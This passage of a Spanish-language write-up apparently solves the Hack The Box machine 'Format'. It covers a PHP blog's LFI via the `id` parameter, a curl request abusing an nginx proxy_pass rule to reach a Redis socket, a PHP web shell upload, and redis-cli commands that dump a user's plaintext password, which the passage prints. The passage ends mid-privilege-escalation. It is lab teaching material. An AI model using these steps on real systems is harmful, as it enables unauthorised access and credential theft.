    <span class="nv">$username</span> <span class="o">=</span> <span class="nv">$redis</span><span class="o">-&gt;</span><span class="nf">HGET</span><span class="p">(</span><span class="nb">trim</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'username'</span><span class="p">]),</span> <span class="s2">"username"</span><span class="p">);</span>
    <span class="k">if</span><span class="p">(</span><span class="nb">strlen</span><span class="p">(</span><span class="nb">strval</span><span class="p">(</span><span class="nv">$username</span><span class="p">))</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
        <span class="nb">header</span><span class="p">(</span><span class="s2">"Location: /register?message=User already exists&amp;status=fail"</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="k">else</span> <span class="p">{</span>
        <span class="nv">$redis</span><span class="o">-&gt;</span><span class="nf">HSET</span><span class="p">(</span><span class="nb">trim</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'username'</span><span class="p">]),</span> <span class="s2">"username"</span><span class="p">,</span> <span class="nb">trim</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'username'</span><span class="p">]));</span>
        <span class="nv">$redis</span><span class="o">-&gt;</span><span class="nf">HSET</span><span class="p">(</span><span class="nb">trim</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'username'</span><span class="p">]),</span> <span class="s2">"password"</span><span class="p">,</span> <span class="nb">trim</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'password'</span><span class="p">]));</span>
        <span class="nv">$redis</span><span class="o">-&gt;</span><span class="nf">HSET</span><span class="p">(</span><span class="nb">trim</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'username'</span><span class="p">]),</span> <span class="s2">"first-name"</span><span class="p">,</span> <span class="nb">trim</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'first-name'</span><span class="p">]));</span>
        <span class="nv">$redis</span><span class="o">-&gt;</span><span class="nf">HSET</span><span class="p">(</span><span class="nb">trim</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'username'</span><span class="p">]),</span> <span class="s2">"last-name"</span><span class="p">,</span> <span class="nb">trim</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'last-name'</span><span class="p">]));</span>
        <span class="nv">$redis</span><span class="o">-&gt;</span><span class="nf">HSET</span><span class="p">(</span><span class="nb">trim</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'username'</span><span class="p">]),</span> <span class="s2">"pro"</span><span class="p">,</span> <span class="s2">"false"</span><span class="p">);</span> <span class="c1">//not ready yet, license keys coming soon</span>
        <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'username'</span><span class="p">]</span> <span class="o">=</span> <span class="nb">trim</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'username'</span><span class="p">]);</span>
        <span class="nb">header</span><span class="p">(</span><span class="s2">"Location: /dashboard?message=Registration successful!&amp;status=success"</span><span class="p">);</span>
    <span class="p">}</span>
</code></pre></div></div>

<p>Primero que nada crear una instancia de la clase <code class="language-plaintext highlighter-rouge">Redis()</code> llamada <code class="language-plaintext highlighter-rouge">redis</code>, y establece una conexion usando el archivo <code class="language-plaintext highlighter-rouge">/var/run/redis/redis.sock</code>, y en caso de que el usuario se haya registrado, se redireccionara a <code class="language-plaintext highlighter-rouge">/dashboard</code> con un mensaje de que se registro correctamente, como se puede ver:</p>

<p><img src="/assets/img/htb-format/5.png" alt="" /></p>

<p>Una vez en el dashboard, nos dejara crear un nuevo blog, que por la estructura, seria un subdominio de <code class="language-plaintext highlighter-rouge">microblog.htb</code> (tambien hay que agregarlo el /etc/hosts)</p>

<p><img src="/assets/img/htb-format/6.png" alt="" /></p>

<p>Tambien podemos ver que podemos editar nuestro blog, donde recibe dos datos, un header (h1) y un texto, en este punto interceptare la peticion con burp.</p>

<p><img src="/assets/img/htb-format/7.png" alt="" /></p>

<p>Vemos como nuestros datos se pasan por una peticion por POST, si volvemos a ver el codigo fuente, encontraremos las funciones que agregan el texto en ambos parametros</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span> <span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'txt'</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="k">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'id'</span><span class="p">]))</span> <span class="p">{</span>
    <span class="nb">chdir</span><span class="p">(</span><span class="nb">getcwd</span><span class="p">()</span> <span class="mf">.</span> <span class="s2">"/../content"</span><span class="p">);</span>
    <span class="nv">$txt_nl</span> <span class="o">=</span> <span class="nb">nl2br</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'txt'</span><span class="p">]);</span>
    <span class="nv">$html</span> <span class="o">=</span> <span class="s2">"&lt;div class = </span><span class="se">\"</span><span class="s2">blog-text</span><span class="se">\"</span><span class="s2">&gt;</span><span class="si">{</span><span class="nv">$txt_nl</span><span class="si">}</span><span class="s2">&lt;/div&gt;"</span><span class="p">;</span>
    <span class="nv">$post_file</span> <span class="o">=</span> <span class="nb">fopen</span><span class="p">(</span><span class="s2">"</span><span class="si">{</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'id'</span><span class="p">]</span><span class="si">}</span><span class="s2">"</span><span class="p">,</span> <span class="s2">"w"</span><span class="p">);</span>
    <span class="nb">fwrite</span><span class="p">(</span><span class="nv">$post_file</span><span class="p">,</span> <span class="nv">$html</span><span class="p">);</span>
    <span class="nb">fclose</span><span class="p">(</span><span class="nv">$post_file</span><span class="p">);</span>
    <span class="nv">$order_file</span> <span class="o">=</span> <span class="nb">fopen</span><span class="p">(</span><span class="s2">"order.txt"</span><span class="p">,</span> <span class="s2">"a"</span><span class="p">);</span>
    <span class="nb">fwrite</span><span class="p">(</span><span class="nv">$order_file</span><span class="p">,</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'id'</span><span class="p">]</span> <span class="mf">.</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">);</span>  
    <span class="nb">fclose</span><span class="p">(</span><span class="nv">$order_file</span><span class="p">);</span>
    <span class="nb">header</span><span class="p">(</span><span class="s2">"Location: /edit?message=Section added!&amp;status=success"</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>
<p>Primero vemos que cambia de directorio al directorio <code class="language-plaintext highlighter-rouge">/content</code>, despues con <code class="language-plaintext highlighter-rouge">$txt_nl = nl2br($_POST['txt']);</code> convierte el valor recibido por el parametro <code class="language-plaintext highlighter-rouge">txt</code> al formato <code class="language-plaintext highlighter-rouge">nl2br</code>, despues con <code class="language-plaintext highlighter-rouge">$post_file = fopen("{$_POST['id']}", "w");</code> se abre el archivo <code class="language-plaintext highlighter-rouge">order.txt</code> en modo escritura con el texto recibido por el parametro <code class="language-plaintext highlighter-rouge">id</code>, y aca vemos lo mas interesante, con <code class="language-plaintext highlighter-rouge">fwrite($post_file, $html);</code>, escribe como contenido HTML del archivo que se abrio anteriormente, es decir, lo que se reciba por el parametro <code class="language-plaintext highlighter-rouge">id</code>, y despues, con <code class="language-plaintext highlighter-rouge">order_file = fopen("order.txt", "a");</code> y <code class="language-plaintext highlighter-rouge">fwrite($order_file, $_POST['id'] . "\n");</code>, esta abriendo el archivo <code class="language-plaintext highlighter-rouge">order.txt</code> y esta escribiendo el contenido de lo que se recibio por el parametro id de la peticion. (saber esto es importante)</p>

<p>La conclusion a la que llegue, es que el archivo <code class="language-plaintext highlighter-rouge">order.txt</code> es el que contiene, o lleva el orden de las secciones que se van agregando cuando se edita un blog, las cuales posteriormente seran escritas como contenido HTML, de hecho, cuando ingresamos los datos en los campos para editar el blog, nos dice que se agrego una nueva secccion</p>

<p><img src="/assets/img/htb-format/8.png" alt="" /></p>

<p>En este punto decidi ver cuando y donde se hace el llamado a <code class="language-plaintext highlighter-rouge">order.txt</code> dentro del proyecto, en caso de que hayas descargado el proyecto y abierto en VScode, usa el atajo <code class="language-plaintext highlighter-rouge">Ctrl + shift + f</code> para buscar, y el primer resultado que me salio fue este codigo:</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">function</span> <span class="n">fetchPage</span><span class="p">()</span> <span class="p">{</span>
    <span class="nb">chdir</span><span class="p">(</span><span class="nb">getcwd</span><span class="p">()</span> <span class="mf">.</span> <span class="s2">"/content"</span><span class="p">);</span>
    <span class="nv">$order</span> <span class="o">=</span> <span class="nb">file</span><span class="p">(</span><span class="s2">"order.txt"</span><span class="p">,</span> <span class="no">FILE_IGNORE_NEW_LINES</span><span class="p">);</span>
    <span class="nv">$html_content</span> <span class="o">=</span> <span class="s2">""</span><span class="p">;</span>
    <span class="k">foreach</span><span class="p">(</span><span class="nv">$order</span> <span class="k">as</span> <span class="nv">$line</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$temp</span> <span class="o">=</span> <span class="nv">$html_content</span><span class="p">;</span>
        <span class="nv">$html_content</span> <span class="o">=</span> <span class="nv">$temp</span> <span class="mf">.</span> <span class="s2">"&lt;div class = </span><span class="se">\"</span><span class="si">{</span><span class="nv">$line</span><span class="si">}</span><span class="se">\"</span><span class="s2">&gt;"</span> <span class="mf">.</span> <span class="nb">file_get_contents</span><span class="p">(</span><span class="nv">$line</span><span class="p">)</span> <span class="mf">.</span> <span class="s2">"&lt;/div&gt;"</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="nv">$html_content</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>
<p>Primero con <code class="language-plaintext highlighter-rouge">chdir(getcwd() . "/content");</code> cambia de dircectorio al directorio <code class="language-plaintext highlighter-rouge">/content</code>, despues con <code class="language-plaintext highlighter-rouge">$order = file("order.txt", FILE_IGNORE_NEW_LINES);</code> esta leyendo el contenido de <code class="language-plaintext highlighter-rouge">order.txt</code> donde se usa <code class="language-plaintext highlighter-rouge">FILE_IGNORE_NEW_LINES</code> para decirle que omita una nueva linea al final de cada elemento del array, esto para que cada elemento de <code class="language-plaintext highlighter-rouge">order.txt</code> contenga una nueva linea dentro del array (seguramente te sacaste de onda por que dije array, y no se esta declarando ningun array, pero es por que asi funciona la funcion <a href="https://www.phptutorial.net/php-tutorial/php-file/">file</a>, ya que lee un archivo completo en un array), despues todo este codigo:</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$html_content</span> <span class="o">=</span> <span class="s2">""</span><span class="p">;</span>
    <span class="k">foreach</span><span class="p">(</span><span class="nv">$order</span> <span class="k">as</span> <span class="nv">$line</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$temp</span> <span class="o">=</span> <span class="nv">$html_content</span><span class="p">;</span>
        <span class="nv">$html_content</span> <span class="o">=</span> <span class="nv">$temp</span> <span class="mf">.</span> <span class="s2">"&lt;div class = </span><span class="se">\"</span><span class="si">{</span><span class="nv">$line</span><span class="si">}</span><span class="se">\"</span><span class="s2">&gt;"</span> <span class="mf">.</span> <span class="nb">file_get_contents</span><span class="p">(</span><span class="nv">$line</span><span class="p">)</span> <span class="mf">.</span> <span class="s2">"&lt;/div&gt;"</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="nv">$html_content</span><span class="p">;</span>
</code></pre></div></div>

<p>Usa un foreach para recorrer cada elemento dentro del array que se guardo en <code class="language-plaintext highlighter-rouge">order</code>, y hace varias cosas:</p>

<ul>
  <li>Se guarda el valor de <code class="language-plaintext highlighter-rouge">$html_content</code> en <code class="language-plaintext highlighter-rouge">$temp</code></li>
  <li>A <code class="language-plaintext highlighter-rouge">$html_content</code> se le asigna el valor de <code class="language-plaintext highlighter-rouge">$temp</code> y demas se le concatena cada linea del array usando <code class="language-plaintext highlighter-rouge">$line</code>, donde en cada linea se creara un elemento HTML(div), despues con <code class="language-plaintext highlighter-rouge">file_get_contents()</code> obtiene el contenido del archivo (order.txt) que corresponde a <code class="language-plaintext highlighter-rouge">$line</code>, y por ultimo con <code class="language-plaintext highlighter-rouge">return $html_content</code> devuelve todo el HTML</li>
</ul>

<h3 id="lfi-local-file-inclusion">LFI (Local File Inclusion)</h3>

<p>El LFI se encuentra en la funcion <code class="language-plaintext highlighter-rouge">fetchPage()</code> cuando se usa <code class="language-plaintext highlighter-rouge">file_get_contents()</code>, ya que como mencione obtiene el contenido basandose en el archivo <code class="language-plaintext highlighter-rouge">order.txt</code>, y que es lo que pasa, nosotros podemos controlar lo que se ingresa en <code class="language-plaintext highlighter-rouge">order.txt</code> por que como explique antes, el archivo <code class="language-plaintext highlighter-rouge">order.txt</code> tiene el texto recibido por el parametro <code class="language-plaintext highlighter-rouge">id</code> cuando editamos el blog cuando creamos una nueva seccion, asi que una vez sabiendo que el parametro ID es vulnerable a LFI, vamos a probar con <code class="language-plaintext highlighter-rouge">../../../etc/passwd</code>, y si, defitivamente es vulnerable a LFI</p>

<p><img src="/assets/img/htb-format/9.png" alt="" /></p>

<p>Eso no es todo, si pasan Wappalyzer por la web, se daran cuenta que usa un servidor nginx, con un reverse proxy igual en nginx, asi que podemos usar el LFI para leer los archivos de configuracion del proxy, que en nginx se encuentran en <code class="language-plaintext highlighter-rouge">/etc/nginx/sites-enabled/default</code> y nos arroja algo como esto:</p>

<h3 id="reverse-proxy-misconfigurations">Reverse proxy misconfigurations</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>server { 
	listen 80; 
	listen [::]:80; 
	root /var/www/microblog/app; 
	index index.html index.htm index-nginx-debian.html; 
	server_name microblog.htb; 
	location / { 
		return 404; 
	} 
	location = /static/css/health/ { 
		resolver 127.0.0.1; 
		proxy_pass http://css.microbucket.htb/health.txt; 
	} 
	location = /static/js/health/ { 
		resolver 127.0.0.1; 
		proxy_pass http://js.microbucket.htb/health.txt; 
	} 
	location ~ /static/(.*)/(.*) { 
		resolver 127.0.0.1; 
		proxy_pass http://$1.microbucket.htb/$2; 
	}
}
</code></pre></div></div>

<p>Observa esta parte:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	location ~ /static/(.*)/(.*) { 
		resolver 127.0.0.1; 
		proxy_pass http://$1.microbucket.htb/$2; 
	}
</code></pre></div></div>

<p>La expresion <code class="language-plaintext highlighter-rouge">/static/(.*)/(.*)</code> es usanda para hacer referencia a dos textos en una URL, donde cada <code class="language-plaintext highlighter-rouge">(.*)</code> corresponde a uno de los dos textos y se usa <code class="language-plaintext highlighter-rouge">$1</code> y <code class="language-plaintext highlighter-rouge">$2</code> para representarlos , por ejemplo, cuando se acceda a <code class="language-plaintext highlighter-rouge">/static/directorio/nose.php</code> la parte de <code class="language-plaintext highlighter-rouge">/directorio</code> estara asociada a <code class="language-plaintext highlighter-rouge">$1</code> y la parte de <code class="language-plaintext highlighter-rouge">nose.php</code> estaria asociada a <code class="language-plaintext highlighter-rouge">$2</code>, y es una implementacion incorrecta en la directiva <code class="language-plaintext highlighter-rouge">proxy_pass</code> asi que nosotros podemos aprovecharnos de esa directiva para acceder a un acrhivo, pero… ¿A cual?</p>

<p>Si volvemos a revisar el codigo fuente, podemos ver una funcion que verifica si una cuenta de usuario en “Pro”</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">function</span> <span class="n">isPro</span><span class="p">()</span> <span class="p">{</span>
    <span class="k">if</span><span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'username'</span><span class="p">]))</span> <span class="p">{</span>
        <span class="nv">$redis</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Redis</span><span class="p">();</span>
        <span class="nv">$redis</span><span class="o">-&gt;</span><span class="nf">connect</span><span class="p">(</span><span class="s1">'/var/run/redis/redis.sock'</span><span class="p">);</span>
        <span class="nv">$pro</span> <span class="o">=</span> <span class="nv">$redis</span><span class="o">-&gt;</span><span class="nf">HGET</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'username'</span><span class="p">],</span> <span class="s2">"pro"</span><span class="p">);</span>
        <span class="k">return</span> <span class="nb">strval</span><span class="p">(</span><span class="nv">$pro</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="s2">"false"</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>
<p>Con:</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code>        <span class="nv">$redis</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Redis</span><span class="p">();</span>
        <span class="nv">$redis</span><span class="o">-&gt;</span><span class="nf">connect</span><span class="p">(</span><span class="s1">'/var/run/redis/redis.sock'</span><span class="p">);</span>
</code></pre></div></div>

<p>Esta conectandose a Redis para establecer una conexion a travez del archivo <code class="language-plaintext highlighter-rouge">/var/run/redis/redis.sock</code>.</p>

<p>Despues basicamente si el usuario tiene la propiedad “pro” establecida como “true”, retorna “true”, y si no, se retornará la cadena “false”, y como tenemos un implementacion incorrecta en el proxy, entonces podemos interactuar con el archivo <code class="language-plaintext highlighter-rouge">/var/run/redis/redis.sock</code> para modificar los valores de la propiedad “pro”, par convertir nuestra cuenta de usuario en pro, y lo podemos hacer de esta manera:</p>

<p><code class="language-plaintext highlighter-rouge">curl -X HSET "http://microblog.htb/static/unix:%2Fvar%2Frun%2Fredis%2Fredis.sock:carta%20pro%20true%20a/b"</code></p>

<p>Y nos debe de regresar algo como esto:</p>

<p><img src="/assets/img/htb-format/10_000.png" alt="" /></p>

<p>Y ya somos pro</p>

<p><img src="/assets/img/htb-format/11.png" alt="" /></p>

<p>Y observa como ahora ya nos deja subir imagenes</p>

<h2 id="lfi-to-rce">LFI to RCE</h2>

<p>Si volvemos a revisar el codigo fuente para subir una imagen, vemos que si intentamos subir un php no va a funcionar por que se esta filtrando</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span> <span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">'image'</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="k">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'id'</span><span class="p">]))</span> <span class="p">{</span>
    <span class="k">if</span><span class="p">(</span><span class="nf">isPro</span><span class="p">()</span> <span class="o">===</span> <span class="s2">"false"</span><span class="p">)</span> <span class="p">{</span>
        <span class="nb">print_r</span><span class="p">(</span><span class="s2">"Pro subscription required to upload images"</span><span class="p">);</span>
        <span class="nb">header</span><span class="p">(</span><span class="s2">"Location: /edit?message=Pro subscription required&amp;status=fail"</span><span class="p">);</span>
        <span class="k">exit</span><span class="p">();</span>
    <span class="p">}</span>
    <span class="nv">$image</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Bulletproof\Image</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">);</span>
    <span class="nv">$image</span><span class="o">-&gt;</span><span class="nf">setLocation</span><span class="p">(</span><span class="nb">getcwd</span><span class="p">()</span> <span class="mf">.</span> <span class="s2">"/../uploads"</span><span class="p">);</span>
    <span class="nv">$image</span><span class="o">-&gt;</span><span class="nf">setSize</span><span class="p">(</span><span class="mi">100</span><span class="p">,</span> <span class="mi">3000000</span><span class="p">);</span>
    <span class="nv">$image</span><span class="o">-&gt;</span><span class="nf">setMime</span><span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="s1">'png'</span><span class="p">));</span>

    <span class="k">if</span><span class="p">(</span><span class="nv">$image</span><span class="p">[</span><span class="s2">"image"</span><span class="p">])</span> <span class="p">{</span>
        <span class="nv">$upload</span> <span class="o">=</span> <span class="nv">$image</span><span class="o">-&gt;</span><span class="nf">upload</span><span class="p">();</span>

        <span class="k">if</span><span class="p">(</span><span class="nv">$upload</span><span class="p">)</span> <span class="p">{</span>
            <span class="nv">$upload_path</span> <span class="o">=</span> <span class="s2">"/uploads/"</span> <span class="mf">.</span> <span class="nv">$upload</span><span class="o">-&gt;</span><span class="nf">getName</span><span class="p">()</span> <span class="mf">.</span> <span class="s2">".png"</span><span class="p">;</span>
            <span class="nv">$html</span> <span class="o">=</span> <span class="s2">"&lt;div class = </span><span class="se">\"</span><span class="s2">blog-image</span><span class="se">\"</span><span class="s2">&gt;&lt;img src = </span><span class="se">\"</span><span class="si">{</span><span class="nv">$upload_path</span><span class="si">}</span><span class="se">\"</span><span class="s2"> /&gt;&lt;/div&gt;"</span><span class="p">;</span>
            <span class="nb">chdir</span><span class="p">(</span><span class="nb">getcwd</span><span class="p">()</span> <span class="mf">.</span> <span class="s2">"/../content"</span><span class="p">);</span>
            <span class="nv">$post_file</span> <span class="o">=</span> <span class="nb">fopen</span><span class="p">(</span><span class="s2">"</span><span class="si">{</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'id'</span><span class="p">]</span><span class="si">}</span><span class="s2">"</span><span class="p">,</span> <span class="s2">"w"</span><span class="p">);</span>
            <span class="nb">fwrite</span><span class="p">(</span><span class="nv">$post_file</span><span class="p">,</span> <span class="nv">$html</span><span class="p">);</span>
            <span class="nb">fclose</span><span class="p">(</span><span class="nv">$post_file</span><span class="p">);</span>
            <span class="nv">$order_file</span> <span class="o">=</span> <span class="nb">fopen</span><span class="p">(</span><span class="s2">"order.txt"</span><span class="p">,</span> <span class="s2">"a"</span><span class="p">);</span>
            <span class="nb">fwrite</span><span class="p">(</span><span class="nv">$order_file</span><span class="p">,</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'id'</span><span class="p">]</span> <span class="mf">.</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">);</span>  
            <span class="nb">fclose</span><span class="p">(</span><span class="nv">$order_file</span><span class="p">);</span>
            <span class="nb">header</span><span class="p">(</span><span class="s2">"Location: /edit?message=Image uploaded successfully&amp;status=success"</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="k">else</span> <span class="p">{</span>
            <span class="nb">header</span><span class="p">(</span><span class="s2">"Location: /edit?message=Image upload failed&amp;status=fail"</span><span class="p">);</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<p>Sin embargo como sabemos que tenemos un LFI en el parametro ID el cual escribe en order.txt, podriamos generar un archivo php el cual se guardara en la ruta <code class="language-plaintext highlighter-rouge">$image-&gt;setLocation(getcwd() . "/../uploads");</code> ya que el codigo anterior cambia de directorio para guardar ahi las imagenes, para generar el archivo en el parametro id debemos de poner <code class="language-plaintext highlighter-rouge">/var/www/microblog/&lt;tu_blog&gt;/uploads/shell.php</code> y en el parametro txt iria el comando que debemos de ejecutar, de esta manera</p>

<p><img src="/assets/img/htb-format/12.png" alt="" /></p>

<p>Asi que ahora al acceder al recurso: <code class="language-plaintext highlighter-rouge">http://&lt;tu_blog&gt;.microblog.htb/uploads/shell.php</code> podemos ver que el comando se ejecuto correctamente</p>

<p><img src="/assets/img/htb-format/13.png" alt="" /></p>

<p>Asi que solo quedar ejecutarnos una reverse shell y ya</p>

<p><img src="/assets/img/htb-format/14.png" alt="" /></p>

<h2 id="flag-de-user">Flag de user</h2>

<p>Si usamos pspy para buscar procesos intersantes, podemos ver que existe uno que se llama <code class="language-plaintext highlighter-rouge">/usr/bin/redis-server</code>, como es un archivo de redis, podemos usar redis-cli -s para conectarnos y mandar comandos al servidor de redis, sin embargo, el ejecutarlo no sale nada aun que este esperando un comando:</p>

<p><img src="/assets/img/htb-format/15.png" alt="" /></p>

<p>Asi que podemos usar: <code class="language-plaintext highlighter-rouge">echo "info" | redis-cli -s /var/run/redis/redis.sock</code> para mostrar informacion del servidor, vemos como tiene establecido un <code class="language-plaintext highlighter-rouge">keyspace</code></p>

<p><img src="/assets/img/htb-format/16.png" alt="" /></p>

<p>Ahora podemos hacer uso de <code class="language-plaintext highlighter-rouge">echo "keys *" | redis-cli -s /var/run/redis/redis.sock</code> para devolver todas las claves almacenadas en la base de datos de Redis, y observa como tenemos una del usuario cooper:</p>

<p><img src="/assets/img/htb-format/17.png" alt="" /></p>

<p>Ahora usaremos <code class="language-plaintext highlighter-rouge">echo "type cooper.dooper" | redis-cli -s /var/run/redis/redis.sock</code> para devolver el tipo de valor que tiene la clave <code class="language-plaintext highlighter-rouge">cooper.dooper</code>, para no poner otra imagen, es un hash, asi que usamos <code class="language-plaintext highlighter-rouge">echo "hgetall cooper.dooper" | redis-cli -s /var/run/redis/redis.sock</code> para que nos devuelva todos los valores asociados al hash de <code class="language-plaintext highlighter-rouge">cooper.dooper</code>, y ahora ya obtuvimos la contraseña de cooper:</p>

<p><img src="/assets/img/htb-format/18.png" alt="" /></p>

<p>Ahora nos conectamos por ssh</p>

<p><strong>usr:</strong> cooper</p>

<p><strong>pass:</strong> zooperdoopercooper</p>

<h2 id="escalada">Escalada</h2>

<p>Si ingresamos el comando <code class="language-plaintext highlighter-rouge">sudo -l</code> para ver que podemos ejecutar como root sin contraseña, tenemos un archivo</p>

<p><img src="/assets/img/htb-format/19.png" alt="" /></p>

<p>Al hacerle un cat, tenemos un archivo de python</p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python3
</span>
<span class="kn">import</span> <span class="n">base64</span>
<span class="kn">from</span> <span class="n">cryptography.hazmat.backends</span> <span class="kn">import</span> <span class="n">default_backend</span>
<span class="kn">from</span> <span class="n">cryptography.hazmat.primitives</span> <span class="kn">import</span> <span class="n">hashes</span>
<span class="kn">from</span> <span class="n">cryptography.hazmat.primitives.kdf.pbkdf2</span> <span class="kn">import</span> <span class="n">PBKDF2HMAC</span>
<span class="kn">from</span> <span class="n">cryptography.fernet</span> <span class="kn">import</span> <span class="n">Fernet</span>
<span class="kn">import</span> <span class="n">random</span>
<span class="kn">import</span> <span class="n">string</span>
<span class="kn">from</span> <span class="n">datetime</span> <span class="kn">import</span> <span class="n">date</span>
<span class="kn">import</span> <span class="n">redis</span>
<span class="kn">import</span> <span class="n">argparse</span>
<span class="kn">import</span> <span class="n">os</span>
<span class="kn">import</span> <span class="n">sys</span>

<span class="k">class</span> <span class="nc">License</span><span class="p">():</span>
    <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="n">self</span><span class="p">):</span>
        <span class="n">chars</span> <span class="o">=</span> <span class="n">string</span><span class="p">.</span><span class="n">ascii_letters</span> <span class="o">+</span> <span class="n">string</span><span class="p">.</span><span class="n">digits</span> <span class="o">+</span> <span class="n">string</span><span class="p">.</span><span class="n">punctuation</span>
        <span class="n">self</span><span class="p">.</span><span class="n">license</span> <span class="o">=</span> <span class="sh">''</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="n">random</span><span class="p">.</span><span class="nf">choice</span><span class="p">(</span><span class="n">chars</span><span class="p">)</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">40</span><span class="p">))</span>
        <span class="n">self</span><span class="p">.</span><span class="n">created</span> <span class="o">=</span> <span class="n">date</span><span class="p">.</span><span class="nf">today</span><span class="p">()</span>

<span class="k">if</span> <span class="n">os</span><span class="p">.</span><span class="nf">geteuid</span><span class="p">()</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">:</span>
    <span class="nf">print</span><span class="p">(</span><span class="sh">""</span><span class="p">)</span>
    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Microblog license key manager can only be run as root</span><span class="sh">"</span><span class="p">)</span>
    <span class="nf">print</span><span class="p">(</span><span class="sh">""</span><span class="p">)</span>
    <span class="n">sys</span><span class="p">.</span><span class="nf">exit</span><span class="p">()</span>

<span class="n">parser</span> <span class="o">=</span> <span class="n">argparse</span><span class="p">.</span><span class="nc">ArgumentParser</span><span class="p">(</span><span class="n">description</span><span class="o">=</span><span class="sh">'</span><span class="s">Microblog license key manager</span><span class="sh">'</span><span class="p">)</span>
<span class="n">group</span> <span class="o">=</span> <span class="n">parser</span><span class="p">.</span><span class="nf">add_mutually_exclusive_group</span><span class="p">(</span><span class="n">required</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
<span class="n">group</span><span class="p">.</span><span class="nf">add_argument</span><span class="p">(</span><span class="sh">'</span><span class="s">-p</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">--provision</span><span class="sh">'</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="sh">'</span><span class="s">Provision license key for specified user</span><span class="sh">'</span><span class="p">,</span> <span class="n">metavar</span><span class="o">=</span><span class="sh">'</span><span class="s">username</span><span class="sh">'</span><span class="p">)</span>
<span class="n">group</span><span class="p">.</span><span class="nf">add_argument</span><span class="p">(</span><span class="sh">'</span><span class="s">-d</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">--deprovision</span><span class="sh">'</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="sh">'</span><span class="s">Deprovision license key for specified user</span><span class="sh">'</span><span class="p">,</span> <span class="n">metavar</span><span class="o">=</span><span class="sh">'</span><span class="s">username</span><span class="sh">'</span><span class="p">)</span>
